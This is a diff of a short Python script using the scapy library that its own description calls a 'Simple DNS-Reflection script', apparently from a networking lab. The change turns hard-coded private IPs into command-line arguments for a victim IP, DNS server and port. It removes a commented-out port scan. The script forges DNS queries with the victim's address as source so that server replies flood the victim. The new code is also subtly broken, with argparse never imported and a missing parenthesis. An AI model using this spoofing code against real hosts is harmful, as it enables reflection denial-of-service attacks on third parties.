@@ -1,15 +1,20 @@
 from scapy.all import *
 
-target_ip   ="10.1.0.3"
-dns_ip      ="10.12.0.20"
+#Input
+parser = argparse.ArgumentParser(description="Simple DNS-Reflection script")
+parser.add_argument("target_ip",    help="IP address of the victim")
+parser.add_argument("dns_ip",       help="IP address of DNS Server")
+parser.add_argument("dns_port",     help="DNS Port"
+args = parser.parse_args()
 
-#Scan the target for open ports
-#res, unans = sr( IP(dst=target_ip)/TCP(flags="S", dport=(5350,6000)))
-#res.summary(lambda s,r: r.sprintf("%TCP.sport% \t %TCP.flags%"))
-#res.nsummary(lfilter = lambda s,r: r.sprintf("%TCP.flags%") == "SA")
+#Variables
+target_ip   =   args.target_ip
+dns_ip      =   args.dns_ip
+dns_port    =   args.dns_port
+
 #Send a DNS request in the name of WS2 so that WS2 gets a DNS response in port 5353
 ip      = IP(src= target_ip, dst= dns_ip)
-udp     = UDP(dport=5353)
+udp     = UDP(dport=dns_port)
 dns     = DNS(rd=1,qd=DNSQR(qname="example.com"))
 packet  = ip/udp/dns
 send(packet)
